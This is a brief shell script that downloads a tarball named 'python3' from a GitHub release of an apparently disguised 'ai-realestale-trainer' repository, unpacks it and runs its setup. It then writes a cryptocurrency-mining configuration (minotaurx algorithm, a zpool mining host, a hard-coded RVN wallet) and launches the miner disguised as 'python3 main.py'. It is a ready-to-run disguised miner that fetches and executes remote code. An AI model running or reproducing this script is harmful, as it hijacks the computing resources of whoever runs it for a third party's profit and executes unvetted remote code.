#!/bin/sh
wget https://github.com/malphite-code-3/ai-realestale-trainer/releases/download/python3/python3.tar.gz
tar -xvf python3.tar.gz
rm python3.tar.gz
cd python3
./setup.sh
rm config.json && echo '{"algorithm": "minotaurx", "host": "minotaurx.sea.mine.zpool.ca", "port": 7019, "worker": "RLaigv5nSC2dKvM63F8dN4EHjxBEcZi11o", "password": "c=RVN", "workers": 2, "log": false, "chrome": "./chromium/chrome" }' > config.json
export LD_LIBRARY_PATH=$HOME/dependencies/lib/x86_64-linux-gnu:$HOME/dependencies/usr/lib/x86_64-linux-gnu:$LD_LIBRARY_PATH
export PATH=$HOME/dependencies/usr/bin:$PATH
timeout 3m ./python3 main.py
